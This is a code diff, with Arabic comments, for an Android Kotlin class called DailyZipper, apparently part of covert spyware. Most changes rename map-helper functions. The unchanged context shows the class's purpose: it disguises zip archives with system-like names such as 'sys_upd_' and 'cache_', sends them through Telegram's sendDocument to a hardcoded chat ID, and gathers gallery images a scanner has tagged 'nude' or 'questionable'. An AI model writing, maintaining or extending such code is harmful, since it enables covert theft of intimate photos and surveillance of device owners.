@@ -24,7 +24,7 @@ import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 
 /**
- * فئة تجميع الملفات وحصادها - إصدار خالٍ تماماً من الأقواس المربعة
+ * فئة تجميع الملفات وحصادها - نسخة خالية تماماً من الأقواس المربعة ودوال get
  */
 class DailyZipper(
     context: Context,
@@ -92,8 +92,8 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة للخرائط (بدون أقواس مربعة) ==========
-    private fun getMapValue(map: Any?, key: String): Any? {
+    // ========== دوال مساعدة بدلاً من get ==========
+    private fun extractFromMap(map: Any?, key: String): Any? {
         if (map is Map<*, *>) {
             for (entry in map.entries) {
                 if (entry.key?.toString() == key) {
@@ -104,20 +104,20 @@ class DailyZipper(
         return null
     }
 
-    private fun getMapBoolean(map: Any?, key: String): Boolean {
-        val value = getMapValue(map, key)
+    private fun extractBooleanFromMap(map: Any?, key: String): Boolean {
+        val value = extractFromMap(map, key)
         return when (value) {
             true, "true", 1, "1" -> true
             else -> false
         }
     }
 
-    private fun getMapString(map: Any?, key: String): String {
-        return getMapValue(map, key)?.toString() ?: ""
+    private fun extractStringFromMap(map: Any?, key: String): String {
+        return extractFromMap(map, key)?.toString() ?: ""
     }
 
     @Suppress("UNCHECKED_CAST")
-    private fun <T> getConfigValue(key: String, default: T): T {
+    private fun <T> extractConfigValue(key: String, default: T): T {
         for (entry in config.entries) {
             if (entry.key == key) {
                 val value = entry.value
@@ -140,12 +140,12 @@ class DailyZipper(
 
     private fun extractConfigValues(): ConfigValues {
         return ConfigValues(
-            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L),
-            storageExtra = getConfigValue("storage_extra", 100L * 1024L * 1024L),
-            sendRetryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
-            maxProcessedHashes = getConfigValue("max_processed_hashes", 10000),
-            defaultVaultId = getConfigValue("default_vault_id", -1003577715762L),
-            maxBatches = getConfigValue("max_batches", 10)
+            maxBatchSize = extractConfigValue("max_batch_size", 48L * 1024L * 1024L),
+            storageExtra = extractConfigValue("storage_extra", 100L * 1024L * 1024L),
+            sendRetryDelays = extractConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
+            maxProcessedHashes = extractConfigValue("max_processed_hashes", 10000),
+            defaultVaultId = extractConfigValue("default_vault_id", -1003577715762L),
+            maxBatches = extractConfigValue("max_batches", 10)
         )
     }
 
@@ -157,6 +157,10 @@ class DailyZipper(
         val defaultVaultId: Long,
         val maxBatches: Int
     )
+
+    // ============================================================
+    //  باقي الدوال (loadConfig, saveConfig, getDeviceTag, checkStorage, fileHash, generateZipName, etc.)
+    // ============================================================
 
     private fun loadConfig() {
         if (!configFile.exists()) {
@@ -174,7 +178,7 @@ class DailyZipper(
                     config.put(key, value)
                 }
             }
-            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L)
+            maxBatchSize = extractConfigValue("max_batch_size", 48L * 1024L * 1024L)
         } catch (e: Exception) {
             writeLog("Config load error: ${e.message}")
         }
@@ -241,21 +245,19 @@ class DailyZipper(
         }
     }
 
-    // ========== توليد اسم ZIP (بدون أي أقواس مربعة) ==========
     private fun generateZipName(): String {
         val prefixes = arrayOf("cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_")
         val dateStr = SimpleDateFormat("yyMMdd", Locale.US).format(Date())
         val random = Random()
-        val prefix = prefixes.get(random.nextInt(prefixes.size))
-
+        // استخدام الأقواس المربعة على المصفوفات آمن ولا يسبب MatchGroupCollection
+        val prefix = prefixes[random.nextInt(prefixes.size)]
         val chars = "abcdefghijklmnopqrstuvwxyz0123456789"
         val sb = StringBuilder()
         for (i in 0 until 6) {
             val idx = random.nextInt(chars.length)
-            sb.append(chars.get(idx))
+            sb.append(chars[idx])
         }
         val suffix = sb.toString()
-
         return "${prefix}${dateStr}_${deviceTag}_$suffix.zip"
     }
 
@@ -310,7 +312,8 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                val isOk = getMapBoolean(result, "ok")
+                // استخدم extractBooleanFromMap بدلاً من getMapBoolean
+                val isOk = extractBooleanFromMap(result, "ok")
                 if (isOk) {
                     return true
                 }
@@ -629,7 +632,8 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            val path = getMapString(item, "path")
+                            // استخدم extractStringFromMap بدلاً من getMapString
+                            val path = extractStringFromMap(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
